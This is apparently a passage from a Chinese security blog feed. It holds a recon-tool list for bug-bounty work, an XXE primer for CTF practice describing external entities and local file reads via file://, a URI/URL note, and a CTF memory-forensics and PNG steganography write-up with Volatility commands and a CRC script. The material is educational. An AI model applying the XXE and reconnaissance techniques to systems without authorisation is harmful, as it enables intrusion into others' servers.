        <content type="html"><![CDATA[<h1 id="前渗透信息搜集改进"><a href="#前渗透信息搜集改进" class="headerlink" title="前渗透信息搜集改进"></a>前渗透信息搜集改进</h1><p>最近开始和宅男师傅一起挖SRC，第一部分我的任务是信息搜集，一周多的时间，完成了部分，给宅男师傅看了后也给了建议，如下：</p><ol><li><p>域名搜集不光要爆破，还要结合互联网上的信息做搜集</p></li><li><p>可以试试软件  <code>Maltego</code></p></li><li><p>想想看C段搜集的时候应该怎么去搜集探测和规避  </p></li></ol><hr><h1 id="所用工具"><a href="#所用工具" class="headerlink" title="所用工具"></a>所用工具</h1><p>整理一下这次信息搜集所用到的方法和工具：  </p><h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><p>使用工具：(DiscoverBroDomain)[<a href="https://github.com/coco413/DiscoverBroDomain]" target="_blank" rel="noopener">https://github.com/coco413/DiscoverBroDomain]</a><br>通过域名查询whois的邮箱，注册人,手机号</p><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>使用工具：<a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain</a></p><h2 id="网络空间资产"><a href="#网络空间资产" class="headerlink" title="网络空间资产"></a>网络空间资产</h2><p>使用Shodan API，一个批量化扫描工具：<a href="https://github.com/zev3n/Shodan_So" target="_blank" rel="noopener">Shodan_So</a></p><h2 id="网络取证工具包"><a href="#网络取证工具包" class="headerlink" title="网络取证工具包"></a>网络取证工具包</h2><p>使用 <a href="https://github.com/medbenali/CyberScan" target="_blank" rel="noopener">CyberScan</a>，可以分析数据包里，攻击者做了哪些渗透的动作</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1]<a href="https://zhuanlan.zhihu.com/p/77207658" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/77207658</a>  </p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF】XXE 入门</title>
      <link href="/2019/11/16//articles/2019/11/16/1573846209652.html/"/>
      <url>/2019/11/16//articles/2019/11/16/1573846209652.html/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE入门"><a href="#XXE入门" class="headerlink" title="XXE入门"></a>XXE入门</h1><h2 id="训练平台"><a href="#训练平台" class="headerlink" title="训练平台"></a>训练平台</h2><p>Pikachu：<a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">链接</a><br>WebGoat：<a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">链接</a></p><h2 id="XXE-XML-External-Entity-Injection"><a href="#XXE-XML-External-Entity-Injection" class="headerlink" title="XXE(XML External Entity Injection)"></a>XXE(XML External Entity Injection)</h2><p>即”XML外部实体注入漏洞”，这是一个注入类型的漏洞，那我们一句话就可以想到 “输入做过滤，输出做转移”<br>简单的说，就是 攻击者通过向服务器<strong>注入指定的XML实体内容</strong>, 从而让服务器<strong>按照攻击者指定的配置进行执行</strong>, 从而导致问题”<br>那么，漏洞利用需要的两个条件就很明确了：  </p><ol><li>服务端<strong>接收和解析</strong>了来自用户端的xml数据。（很多语言里面对应的解析XML的函数默认是禁止解析外部实体内容，从根本上避免了该漏洞）</li><li>服务端对上述XML数据没有做严格的安全控制（例如过滤）</li></ol><h3 id="什么是XML？"><a href="#什么是XML？" class="headerlink" title="什么是XML？"></a>什么是XML？</h3><p>参考：<a href="https://hpdoger.cn/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">链接</a><br>英文名：Extensible Markup Language，也是一种标记语言（e.g. HTML）主要将文本（Text）以及文本相关的其他信息结合起来，展现出关于<strong>文档结构和数据处理细节</strong>的计算机文字编码。  </p><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><p>XML被广泛用来作为<strong>跨平台之间交互数据</strong>（传输数据）的形式，主要<strong>针对数据的内容</strong>（存储数据），通过不同的格式化描述手段（XSLT，CSS等）可以完成最终的形式表达（生成对应的HTML，PDF或者其他的文件格式）。简单来说，就是存储数据的一种格式，e.g. JSON。</p><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>这是一个XML例子：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191116030140.png" alt="XML例子"></p><p>主要由以下三部分组成：</p><ol><li>XML声明</li><li>DTD（Document Type Definition，文档类型定义）<br>可以理解为一个专门定义全局变量的区域，在其中可以定义实体（Entity）。<br>实体根据类型可分为：</li></ol><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)<br>根据引用方式可分为：</li><li>内部引用（格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>）</li><li>外部引用（格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>）<br>注意，这个外部的含义，是相对于这个XML文档来说，只要不是这个文档的，就算外部，而不是特定要其他网络上服务器的</li></ul><ol start="3"><li>文档元素/正文</li></ol><h3 id="看懂XML外部实体"><a href="#看懂XML外部实体" class="headerlink" title="看懂XML外部实体"></a>看懂XML外部实体</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191116023747.png" alt="字真难看"><br>注意，图中file://协议，主要就是用于访问本地（相对于服务端）文件的。<br>不同的URI：<br><!ENTITY 实体名称 "实体的值"></p><h3 id="举个栗子🌰"><a href="#举个栗子🌰" class="headerlink" title="举个栗子🌰"></a>举个栗子🌰</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191116032414.png" alt="接受XML的一个API"></p><p>对XML内容的处理，使用函数simplexml_load_string()，将<strong>形式良好，符合规范</strong>的XML字符串转换为 SimpleXMLElement对象。问题就出在PHP解析XML使用libxml，而后者在2.9.0版本之前，没有禁止解析XML外部实体内容。</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191116032519.png" alt="对XML内容的处理"></p><p>Pikachu XXE练习：<a href="http://119.3.78.82:8089/vul/xxe/xxe_1.php" target="_blank" rel="noopener">链接</a></p><h3 id="练习一下"><a href="#练习一下" class="headerlink" title="练习一下"></a>练习一下</h3><p>《API调用》：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">链接</a></p><p>CTF Blind XXE</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 安全综合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Note】URI 和 URL</title>
      <link href="/2019/11/16//articles/2019/11/16/1573845532259.html/"/>
      <url>/2019/11/16//articles/2019/11/16/1573845532259.html/</url>
      
        <content type="html"><![CDATA[<h1 id="URI-和-URL"><a href="#URI-和-URL" class="headerlink" title="URI 和 URL"></a>URI 和 URL</h1><p>URI，Uniform Resource Identifiers，即统一资源标识符。用于在互联网上标识一个资源，范围更大。<br>URL，Uniform Resource Locator，即统一资源定位器。是一种具体的URI，可以用来标识一个资源（的路径）。  </p><p>不同框架下支持的URI：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191116031801.png" alt="不同的URI"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 小笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道题看内存取证与图片隐写</title>
      <link href="/2019/11/15//articles/2019/11/15/1573807836714.html/"/>
      <url>/2019/11/15//articles/2019/11/15/1573807836714.html/</url>
      
        <content type="html"><![CDATA[<h1 id="从一道题看内存取证与图片隐写"><a href="#从一道题看内存取证与图片隐写" class="headerlink" title="从一道题看内存取证与图片隐写"></a>从一道题看内存取证与图片隐写</h1><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191115165611.png" alt="封面"><br>图：没有啥关系，但是当作一个封面的图片 </p><p>这是第三届红帽杯的Misc题目：Advertising for Marriage，一道做了挺久，但是还是差一个关键步骤的题目。在做题过程中也学到了新的内存取证的知识，因此以此题作为切入，写下本篇WP/学习笔记。</p><h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><h3 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h3><p>以下为题目：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191113004921.png" alt="题目" style="zoom:50%;" /></p><h3 id="题目下载"><a href="#题目下载" class="headerlink" title="题目下载"></a>题目下载</h3><p>某云备份：<a href="https://pan.baidu.com/s/19IReJhHKDNa7EC4cjGSpaw" target="_blank" rel="noopener">q4nw</a></p><h3 id="⚠️注意："><a href="#⚠️注意：" class="headerlink" title="⚠️注意："></a>⚠️注意：</h3><p>这次题目，给我的一个很大教训就是，题目中的信息！Misc作为CTF中的一种题型，它的特点之一就是“脑洞”和“列文虎克”般的观察能力以及对信息的逻辑整合能力。<br>题目中的 “Someone want” 其实在题目最后几个步骤中，是一个很重要的提示——确定这个someone是谁，也就是补充完整后面得到的密钥内容（hint，后面会讲到）。  </p><h3 id="✈️启发："><a href="#✈️启发：" class="headerlink" title="✈️启发："></a>✈️启发：</h3><p>本题作为一道内存取证题，体现的考察内容，其实不单单与解题的工具、技巧有关，很大程度上也是考察一种通用能力：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191113005806.png" alt="TK公开课" style="zoom:50%;" /><br>（来自TK的公开课，<a href="https://www.leiphone.com/news/201704/4qTw6sbX8AlTlbOs.html" target="_blank" rel="noopener">链接</a>）<br>其中，我们可以看到，对Misc/取证分析题目的信息进行分析的能力（是否为hint？）判断能力（是否重要？）规划能力（解题的总体步骤和阶段性步骤？）搜集能力（哪些地方得到信息？）学习能力（如何获取信息？）提炼能力（信息间如何进行整合？）都是非常重要的，对做题还是其他的学习和生活。<br><strong>努力提高自己的通用能力，能想清楚，能写清楚，能讲清楚，逻辑严密，语句通顺，表达清晰</strong>。“无论以后你想从事什么工作，在学生时代加强这些能力的培养，对你整个人生都会有很大的帮助。”    ——TK</p><h2 id="做题笔记"><a href="#做题笔记" class="headerlink" title="做题笔记"></a>做题笔记</h2><p>以下是我做题时的一些笔记，有些并不正确或者对解该题没有帮助，放在这里，记录自己的想法：</p><ol><li><p>查看可能是个Windows磁盘镜像<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191113014150.png" alt="可疑文件"><br>发现可疑文件，但可能只是用户的头像，注意时间</p></li><li><p>发现cookies文件<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191113014305.png" alt="cookies文件"></p></li></ol><p>010打开发现全为空00</p><ol start="3"><li>发现桌面PNG文件</li><li>Stegsolve打开<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191113014411.png" alt="Stegsolve打开"><br>眼睛上像不像二维码？？  &gt; <a href="https://xz.aliyun.com/t/2788" target="_blank" rel="noopener">https://xz.aliyun.com/t/2788</a></li><li>IHDR报错，猜测修改宽高，计算CRC<br>计算得211，修改IHDR，显示正常</li><li>发现IDAT有问题<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191113014444.png" alt="IDAT问题"></li><li>扩展：PNG图像隐写<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/</a></li><li>尝试LSB<br>使用工具<a href="https://github.com/livz/cloacked-pixel" target="_blank" rel="noopener">https://github.com/livz/cloacked-pixel</a></li><li>去除了IEND后面（82）的00</li></ol><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="判断文件-题目类型"><a href="#判断文件-题目类型" class="headerlink" title="判断文件/题目类型"></a>判断文件/题目类型</h3><p>首先，拿到题目文件，使用binwalk分析，判断文件类型（输出到txt文件，方便查询信息）</p><figure class="highlight plain"><figcaption><span>xxx.raw > fileInfo.txt```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">可以看到其中有很多Microsoft到信息，且文件形式中很类似于磁盘文件，可以初步判断这是一个Windows磁盘镜像，这很有可能是一道内存取证题。</span><br><span class="line">&gt; ⚠️注意：此时，判断好类型题目，就应该在心态上调整过来，这是一道取证分析题目，取证分析 &#x3D; 取证 + 分析，因此，在做题过程中，核心就是做细致的取证工作，获取充分的信息，以及很重要的逻辑分析、串联、整合、归纳。  </span><br><span class="line"></span><br><span class="line">### 查看镜像信息</span><br><span class="line"></span><br><span class="line">接下来，确定此为磁盘镜像后，使用内存取证工具&#96;&#96;&#96;Volatility&#96;&#96;&#96;**查看镜像信息**（常常含有出题人的hint）：</span><br><span class="line">&#96;&#96;&#96;volatility imageinfo -f xxx.raw</span><br></pre></td></tr></table></figure><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191115163046.png" alt="查看镜像信息"><br>图：查看镜像信息</p><p>从结果中，可以看到，Suggest Profile为WinXPSP2x86，也就是，Volatility对该镜像文件的架构识别为WinXPSP2x86，此后对该镜像的很多操作，都需要指定预设，例如 <code> --profile WinXPSP2x86</code>。因此，需要将磁盘镜像中的这个关键信息记录下来，以备后面使用。</p><p>💡Tips：可以列举该架构可以使用的命令, e.g.</p><figure class="highlight plain"><figcaption><span>-f xxx.raw --profile</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 方式一：使用DiskGenius</span><br><span class="line"></span><br><span class="line">使用数据恢复综合软件DiskGenius打开虚拟磁盘——恢复文件，可以直接以GUI的形式看到磁盘镜像的内容。然后需要不断翻阅文件目录，寻找可疑的文件&#x2F;文件夹（重点看一下桌面）。</span><br><span class="line">![vegetable.png](https:&#x2F;&#x2F;image-host-toky.oss-cn-shanghai.aliyuncs.com&#x2F;vegetable_origin.png)  </span><br><span class="line">图·桌面的vegetable.png</span><br><span class="line"></span><br><span class="line">发现桌面可疑文件 vegetable.png，PNG图片，恢复可得，根据图片内容猜测为图片隐写。</span><br><span class="line"></span><br><span class="line">### 方式二：使用Volatility</span><br><span class="line"></span><br><span class="line">使用Volatility可以更加方便于严谨地分析文件的内容。具体的教程可以查看该博客：[链接](https:&#x2F;&#x2F;mengsec.com&#x2F;2018&#x2F;10&#x2F;20&#x2F;CTF-Volatility&#x2F;)  </span><br><span class="line">1. 首先，**查看进程：**</span><br></pre></td></tr></table></figure><p>volatility pslist -f xxx.raw</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; TODO 图·进程显示</span><br><span class="line">pslist可以用来列出运行的进程。如果Exit所在的一列显示了日期时间，则表明该进程已经结束了。 在图中，我们看到，存在notepad.exe, mspaint.exe，也就是取证对象（出题人）使用过记事本、画图程序。</span><br><span class="line">&gt; 在查看进程的显示时，注意一下记事本程序notepad.exe, 画画工具mspaint.exe以及DumpIt等使用过的软件，这些就是取证对象的操作，其中很有可能有重要信息。因此在逻辑清晰的一个做题过程中，我们需要对取证对象的操作，分别进行纵向地分析，然后回过头来结合起来进行分析。   </span><br><span class="line">&gt;</span><br><span class="line">Dumpit.exe 一款内存镜像提取工具</span><br><span class="line">TrueCrypt.exe 一款磁盘加密工具</span><br><span class="line">Notepad.exe windows自带的记事本</span><br><span class="line">Mspaint,exe windows自带画图工具</span><br><span class="line"></span><br><span class="line">2. **查看notepad.exe**</span><br><span class="line"></span><br><span class="line">如果需要查看Notepad程序编辑的内容，需要使用Volatility的Notepad插件：</span><br></pre></td></tr></table></figure><p>volatility notepad -f xxx.raw </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">![Notepad中的Hint](https:&#x2F;&#x2F;image-host-toky.oss-cn-shanghai.aliyuncs.com&#x2F;20191115163249.png)</span><br><span class="line">图·Notepad中的Hint  </span><br><span class="line">可以看到提示：&#96;&#96;&#96;hint:????needmoneyandgirlfirend&#96;&#96;&#96;。  </span><br><span class="line"></span><br><span class="line">⚠️注意：在做题过程中，我忽略了hint中的问号????，这个其实是个重要的提示，结合前面题目中的提示 Someone want，可以推测出，这是让我们确定someone的名字，而且这个句子在一个内存取证结合图片隐写（后面会发现）的题目中，很有可能是一个密钥key。</span><br><span class="line"></span><br><span class="line">3. **查看mspaint.exe**</span><br><span class="line"></span><br><span class="line">接下来，我们查看内存操作中对画图程序操作的内容，使用插件mspaint。</span><br><span class="line">详细教程查看：[《利用volatility与Gimp实现Windows内存取证》](https:&#x2F;&#x2F;segmentfault.com&#x2F;a&#x2F;1190000018813033)</span><br><span class="line"></span><br><span class="line">可以看到mspaint进程pid号，为332，dump下来</span><br></pre></td></tr></table></figure><p>volatility -f Advertising_for_Marriage.raw –profile=WinXPSP2x86 memdump -p 332 –dump-dir=./</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">生成332.dmp修改后缀为332.data，用gimp打开，偏移量（offset）即为分辨率，又因为该系统为Window XP系统，分辨率一般为800x768&#x3D;614400。设置分辨率，可得：</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;image-host-toky.oss-cn-shanghai.aliyuncs.com&#x2F;20191126090113.png&quot; alt&#x3D;&quot;设置偏移量后的332.data&quot; style&#x3D;&quot;zoom:50%;&quot; &#x2F;&gt;</span><br><span class="line">黄色部分很像菠萝，细看有字母需要图片变换，水平翻转180度，垂直镜像翻转可得：</span><br><span class="line">![菠萝图](https:&#x2F;&#x2F;image-host-toky.oss-cn-shanghai.aliyuncs.com&#x2F;20191126090046.png)</span><br><span class="line"></span><br><span class="line">得到字符 &#96;&#96;&#96;b1cx&#96;&#96;&#96;，结合之前，缺少的四个字符（？？？？），得到密钥：b1cxneedmoneyandgirlfriend。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4. 扫描文件</span><br><span class="line"></span><br><span class="line">使用Volatility中的filescan功能，保存为txt，方便后续查找分析：</span><br></pre></td></tr></table></figure><p>volatility filescan -f xxx.raw –profile=WinXPSP2x86 &gt; filescanInfo.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">通过内存取证操作（见后面列举），查找到PNG图片</span><br></pre></td></tr></table></figure><p>volatility filescan -f Advertising\ for\ Marriage.raw –profile=WinXPSP2x86 | grep “jpg|jpeg|png|tif|gif|bmp”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">![Volatility文件扫描](https:&#x2F;&#x2F;image-host-toky.oss-cn-shanghai.aliyuncs.com&#x2F;20191115164548.png)</span><br><span class="line">图·Volatility扫描图片  </span><br><span class="line"></span><br><span class="line">导出图片：</span><br><span class="line">&#96;&#96;&#96;volatility -f xxx.raw dumpfiles -Q 0x000000000249ae78 -D --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><h3 id="发现图片隐写"><a href="#发现图片隐写" class="headerlink" title="发现图片隐写"></a>发现图片隐写</h3><p>Linux 打开vegetable.png发现提示IHDR：CRC 错误，Windows可以正常打开，可以猜测图片尺寸被修改了。</p><h4 id="⚠️知识点补充"><a href="#⚠️知识点补充" class="headerlink" title="⚠️知识点补充"></a>⚠️知识点补充</h4><p>PNG格式图片的文件头为：89 50 4E 47 0D 0A 1A 0A，该段格式是固定的。windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。<br>而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况</p><h4 id="恢复正常尺寸"><a href="#恢复正常尺寸" class="headerlink" title="恢复正常尺寸"></a>恢复正常尺寸</h4><p>使用脚本计算正确的CRC校验值，并恢复其正常尺寸：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">img = open(<span class="string">"vegetable.png"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">        data = img[<span class="number">0xc</span>:<span class="number">0x10</span>] + struct.pack(<span class="string">'&gt;i'</span>,w) + struct.pack(<span class="string">'&gt;i'</span>,h) + img[<span class="number">0x18</span>:<span class="number">0x1d</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32 == struct.unpack(<span class="string">'&gt;i'</span>,img[<span class="number">0x1d</span>:<span class="number">0x21</span>])[<span class="number">0</span>] &amp; <span class="number">0xffffffff</span>:</span><br><span class="line">            <span class="keyword">print</span> w, h</span><br><span class="line">            <span class="keyword">print</span> hex(w), hex(h)</span><br><span class="line">            <span class="comment"># 直接恢复图片正常尺寸，保存为新的图片</span></span><br><span class="line">            open(<span class="string">"vegetable_new.png"</span>, <span class="string">"wb"</span>).write(img[:<span class="number">0xc</span>] + data + img[<span class="number">0x1d</span>:])</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h4 id="🔧工具推荐"><a href="#🔧工具推荐" class="headerlink" title="🔧工具推荐"></a>🔧工具推荐</h4><p>使用pngcheck可以对PNG图片进行检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pngcheck -v xxx.png</span><br></pre></td></tr></table></figure><p>010Editor具有template检测功能，会检测出图片被修改后的很多报错信息，这也是一个好提示：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191114085728.png" alt="010Editor提示" style="zoom:50%;" /></p><h3 id="发现LSB隐写"><a href="#发现LSB隐写" class="headerlink" title="发现LSB隐写"></a>发现LSB隐写</h3><p>结合Hint中的文字提示，结合Stegsolve查看图片分析，可以判断其为LSB隐写（详细介绍在后面的PNG图片相关章节），具体的LSB隐写分析如下：<br>在对vegetable.png使用Stegsolve查看时，切换不同的通道，发现在Red plane1,Blue plane1, Green plane1, 图片上方存在异常，显示为一个横条，由此可猜测为LSB隐写：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191115154928.png" alt="Red plane1"><br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191115155057.png"><br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191115155155.png" alt="Green plane1"></p><p>使用<a href="https://github.com/livz/cloacked-pixel" target="_blank" rel="noopener">cloacked-pixel</a>工具，使用密钥进行解密：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lsb.py extract .&#x2F;vegetable.png out b1cxneedmoneyandgirlfirend</span><br></pre></td></tr></table></figure><p>Base64解密，维吉尼亚解密（密钥相同）即可。</p><h2 id="✈️-CTF图片隐写题到手三连"><a href="#✈️-CTF图片隐写题到手三连" class="headerlink" title="✈️ CTF图片隐写题到手三连"></a>✈️ CTF图片隐写题到手三连</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看图片明文字符串</span><br><span class="line">strings xxx.png</span><br><span class="line"># binwalk分析，</span><br><span class="line">binwalk xxx.png -f picInfo.txt</span><br><span class="line"># foremost 切分图片</span><br><span class="line">foremost xxx.png -o output_xxx</span><br></pre></td></tr></table></figure><h2 id="PNG-图片相关"><a href="#PNG-图片相关" class="headerlink" title="PNG 图片相关"></a>PNG 图片相关</h2><p>此处探讨PNG图片的文件结构等数字特征，了解这些对解题很有帮助。PNG（Portable Network Graphics，便携式网络图形），从名字上看，这就是一种适用于网络传输的格式。</p><h3 id="PNG-文件结构"><a href="#PNG-文件结构" class="headerlink" title="PNG 文件结构"></a>PNG 文件结构</h3><p>Refer: <a href="https://www.w3.org/TR/PNG/#5ChunkOrdering" target="_blank" rel="noopener">详细的参考</a>  </p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191115084448.png" alt="PNG文件结构"><br>从上图可知，一个标准的PNG图片文件结构包含：</p><ol><li>PNG文件标志，即文件头：89 50 4e 47 0d 0a 1a 0a。这8位是不会变的。</li><li>PNG数据块：  </li></ol><ul><li><p>关键数据块：定义了4种标准数据块</p></li><li><p>辅助数据块：</p><ul><li><p>IHDR<br>文件头数据块IHDR是PNG文件中的第一个数据块（即在文件头之后, 0A之后），而且一个PNG文件中只能有一个文件头数据块，它包含PNG文件中存储的图像数据的基本信息，e.g. 宽，高，图像深度，图像类型，压缩方法等。  </p><p>💡Tips：如何找到和修改16进制编辑器下的图片宽和高？查看图分辨率（10进制），转换为16进制，在16进制编辑器中查找，在IHDR部分的就是宽和高。  </p><p>🎯出题点：比赛中经常通过改变宽和高使得图片显示不完整或者无法显示从而达到隐藏信息的目的。对于这种情况，我们不能轻易修改图片的宽或高的值，应该通过CRC的值推算出宽或高的值，使用脚本计算；或者是修改宽或高的值后，计算修改后的CRC，计算得出新的CRC值替换原本的值，以防图片报错打不开。  </p></li></ul><ul><li><p>PLTE<br>  调色板数据块 PLTE（palette chunk），包含：索引彩色图像（indexed-color image）相关的彩色变换数据，其仅与索引彩色图像有关，而且要放在图像数据块（image data chunk）之前。真彩色的 PNG 数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。<br>🎯题目：一道和PLTE有关的题 &gt; <a href="https://rawsec.ml/en/fit-hack-2017-write-ups/" target="_blank" rel="noopener">链接</a>  </p></li><li><p>IDAT<br>图像数据块 IDAT（image data chunk）：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。这是一个可以存在多个数据块类型的数据块。它的作用就是<strong>存储着图像真正的数据</strong>。IDAT采用 LZ77 算法的派生算法进行压缩，可以用 zlib 解压缩（因此有时候foremost切割PNG会出现一些打不开的压缩包）。值得注意的是，<strong>IDAT 块只有当上一个块充满时，才会继续一个新的块</strong>。因此，做PNG隐写时，一定使用pngcheck查看一下PNG的文件结构信息，注意一下IDAT是否有出现没有填充满就开始新的一个数据块的情况（正常充满的长度应该是<strong>65524</strong>）。  </p><p>🎯出题点：此处是出题的重灾区，常见的是LSB隐写（详细介绍教程：<a href="https://3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-PNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99/" target="_blank" rel="noopener">链接</a>）：</p><blockquote><p>LSB全称least significant bit，最低有效位<br>PNG文件中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216 种颜色<br>人类的眼睛可以区分约1000万种不同的颜色<br>这意味着人类的眼睛无法区分余下的颜色大约有6777216种<br>LSB隐写就是<strong>修改RGB颜色分量的最低二进制位（LSB）</strong>，而人类的眼睛不会注意到这前后的变化<br>每个像数可以携带3比特的信息<br>🔧工具推荐：<a href="https://github.com/livz/cloacked-pixel" target="_blank" rel="noopener">cloacked-pixel</a> LSB隐写加解密工具，还有analyse功能，可以进行LSB检测  